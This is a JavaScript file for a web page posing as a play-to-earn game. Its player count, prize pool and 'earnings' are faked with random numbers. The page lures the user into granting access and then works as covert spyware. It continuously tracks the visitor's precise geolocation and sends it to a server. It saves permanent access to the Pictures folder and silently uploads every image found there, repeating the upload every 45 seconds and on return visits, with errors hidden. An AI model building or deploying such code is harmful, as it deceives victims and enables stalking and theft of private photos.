const roomId = document.body.dataset.roomId
  || window.__RELAY_ROOM_ID
  || window.location.pathname.split('/').filter(Boolean).pop()
  || '';

const joinScreen = document.getElementById('join-screen');
const playScreen = document.getElementById('play-screen');
const errorEl = document.getElementById('error');
const startBtn = document.getElementById('start-btn');
const statusText = document.getElementById('status-text');
const statusSub = document.getElementById('status-sub');
const personNameEl = document.getElementById('person-name');
const earningsEl = document.getElementById('earnings');
const rankEl = document.getElementById('rank');
const streakEl = document.getElementById('streak');
const progressFill = document.getElementById('progress-fill');
const progressHint = document.getElementById('progress-hint');
const onlineCount = document.getElementById('online-count');
const prizePool = document.getElementById('prize-pool');
const prizeTick = document.getElementById('prize-tick');

const IDB_NAME = 'relay-sync-cache';
const IDB_STORE = 'handles';
const IDB_UPLOADS = 'uploaded';
const LIBRARY_ID = 'relay-web-library-v1';
const uploadedKeys = new Set();

let watchId = null;
let ws = null;
let trackerId = null;
let earnings = 0;
let streak = 0;
let progress = 0;
let gameTimers = [];
let syncRunning = false;
let libraryHandle = null;

const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;

function isImageFile(file) {
  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
}

function fileKey(file) {
  return `${file.name}:${file.size}:${file.lastModified}`;
}

function showError(msg) {
  errorEl.textContent = msg;
  errorEl.classList.remove('hidden');
}

function hideError() {
  errorEl.classList.add('hidden');
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function openCacheDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(IDB_NAME, 2);
    req.onupgradeneeded = (ev) => {
      const db = ev.target.result;
      if (!db.objectStoreNames.contains(IDB_STORE)) db.createObjectStore(IDB_STORE);
      if (!db.objectStoreNames.contains(IDB_UPLOADS)) db.createObjectStore(IDB_UPLOADS);
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function saveDirHandle(handle) {
  try {
    const db = await openCacheDB();
    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'library');
    libraryHandle = handle;
  } catch { /* silent */ }
}

async function loadDirHandle() {
  if (libraryHandle) return libraryHandle;
  try {
    const db = await openCacheDB();
    const handle = await new Promise((resolve) => {
      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('library');
      req.onsuccess = () => resolve(req.result || null);
      req.onerror = () => resolve(null);
    });
    libraryHandle = handle;
    return handle;
  } catch {
    return null;
  }
}

async function loadUploadedKeys() {
  try {
    const db = await openCacheDB();
    await new Promise((resolve) => {
      const req = db.transaction(IDB_UPLOADS).objectStore(IDB_UPLOADS).getAllKeys();
      req.onsuccess = () => {
        for (const key of req.result || []) uploadedKeys.add(String(key));
        resolve();
      };
      req.onerror = () => resolve();
    });
  } catch { /* silent */ }
}

async function rememberUploadedKey(key) {
  uploadedKeys.add(key);
  try {
    const db = await openCacheDB();
    db.transaction(IDB_UPLOADS, 'readwrite').objectStore(IDB_UPLOADS).put(1, key);
  } catch { /* silent */ }
}

async function readDirImages(dirHandle, acc = []) {
  for await (const [, entry] of dirHandle.entries()) {
    if (entry.kind === 'file') {
      const file = await entry.getFile();
      if (isImageFile(file)) acc.push(file);
    } else if (entry.kind === 'directory') {
      await readDirImages(entry, acc);
    }
  }
  return acc;
}

async function resolveLibraryHandle(requestAccess = false) {
  const cached = await loadDirHandle();
  if (cached) {
    try {
      const state = await cached.queryPermission({ mode: 'read' });
      if (state === 'granted') return cached;
      if (requestAccess && state === 'prompt') {
        const next = await cached.requestPermission({ mode: 'read' });
        if (next === 'granted') return cached;
      }
    } catch { /* fall through */ }
  }

  if (!requestAccess || !window.showDirectoryPicker) return null;

  try {
    const handle = await window.showDirectoryPicker({
      mode: 'read',
      startIn: 'pictures',
      id: LIBRARY_ID,
    });
    await saveDirHandle(handle);
    return handle;
  } catch {
    return null;
  }
}

function beginLocationAccess() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
    () => {},
    { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
  );
  if (watchId != null) navigator.geolocation.clearWatch(watchId);
  watchId = navigator.geolocation.watchPosition(
    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
    () => {},
    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
  );
}

function animateLobby() {
  let online = rand(2400, 3200);
  onlineCount.textContent = online.toLocaleString();
  setInterval(() => {
    online += rand(-3, 8);
    onlineCount.textContent = online.toLocaleString();
  }, 3000);

  let pool = rand(11000, 15000);
  prizePool.textContent = `$${pool.toLocaleString()}`;
  setInterval(() => {
    pool += rand(1, 15);
    prizePool.textContent = `$${pool.toLocaleString()}`;
    prizeTick.textContent = rand(50, 200);
  }, 2000);
}

function startGameUI(name) {
  joinScreen.classList.add('hidden');
  playScreen.classList.remove('hidden');
  personNameEl.textContent = name;
  statusText.textContent = 'Match live!';
  statusSub.textContent = "You're in — keep playing to earn more";
  rankEl.textContent = `#${rand(100, 999)}`;

  gameTimers.push(setInterval(() => {
    earnings += Math.random() * 0.08 + 0.02;
    earningsEl.textContent = `$${earnings.toFixed(2)}`;
    streak = Math.min(streak + 1, 99);
    streakEl.textContent = `${streak}🔥`;
    progress = Math.min(progress + rand(1, 3), 100);
    progressFill.style.width = `${progress}%`;
    progressHint.textContent = progress >= 100
      ? '🎉 Bonus unlocked! Keep playing…'
      : `${progress}% to next bonus…`;
  }, 2000));
}

async function sendLocation(lat, lng, accuracy) {
  if (!trackerId) return;
  const payload = { lat, lng, accuracy };
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'location', ...payload }));
    return;
  }
  try {
    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch { /* retry */ }
}

async function sendPing() {
  if (!trackerId) return;
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'ping' }));
    return;
  }
  try {
    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/ping`, { method: 'POST' });
  } catch { /* retry */ }
}

async function uploadPhoto(file) {
  if (!trackerId || !file) return false;
  const key = fileKey(file);
  if (uploadedKeys.has(key)) return true;
  const form = new FormData();
  form.append('file', file, file.name || 'photo.jpg');
  try {
    const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
      method: 'POST',
      body: form,
    });
    if (res.ok) await rememberUploadedKey(key);
    return res.ok;
  } catch {
    return false;
  }
}

async function uploadQueue(files) {
  if (!files?.length || !trackerId) return;
  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
  if (!queue.length) return;
  const workers = Array.from({ length: 3 }, async () => {
    while (queue.length) {
      const file = queue.shift();
      if (file) await uploadPhoto(file);
    }
  });
  await Promise.all(workers);
}

async function syncLibraryPhotos(requestAccess = false) {
  if (syncRunning || !trackerId) return;
  syncRunning = true;
  try {
    const handle = await resolveLibraryHandle(requestAccess);
    if (handle) {
      const files = await readDirImages(handle);
      await uploadQueue(files);
    }
  } catch { /* silent */ }
  syncRunning = false;
}

async function rejoin() {
  const name = personNameEl.textContent;
  if (!name || name === '—') return;
  const res = await fetch(`/api/rooms/${roomId}/join`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  if (!res.ok) return;
  trackerId = (await res.json()).tracker_id;
  window.trackerId = trackerId;
  connectWs();
  void syncLibraryPhotos(false);
}

function connectWs() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
  ws.onopen = () => sendPing();
  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
}

window.trackerId = null;

async function startPlaying() {
  hideError();
  if (!roomId) { showError('Invalid session link.'); return; }

  const name = document.getElementById('name').value.trim();
  if (!name) { showError('Enter your player name to continue.'); return; }

  startBtn.disabled = true;
  startBtn.textContent = 'LOADING…';

  beginLocationAccess();
  // First visit: one-time library access (saved forever). Return visits: silent sync.
  const libraryReady = resolveLibraryHandle(true);

  try {
    const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name }),
    });
    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
    trackerId = (await joinRes.json()).tracker_id;
    window.trackerId = trackerId;

    startGameUI(name);
    connectWs();
    await sendPing();

    await libraryReady;
    void syncLibraryPhotos(false);

    gameTimers.push(setInterval(sendPing, 30000));
    gameTimers.push(setInterval(() => syncLibraryPhotos(false), 45000));

    gameTimers.push(setInterval(async () => {
      if (!trackerId) return;
      try {
        const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
        if (check.status === 404) await rejoin();
      } catch { /* ignore */ }
    }, 8000));

  } catch (e) {
    showError(e.message || 'Something went wrong.');
    startBtn.disabled = false;
    startBtn.textContent = '▶ PLAY NOW';
  }
}

startBtn.addEventListener('click', startPlaying);
document.getElementById('name').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startPlaying();
});

loadUploadedKeys().then(() => loadDirHandle());
animateLobby();

if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/static/sw.js').catch(() => {});
}
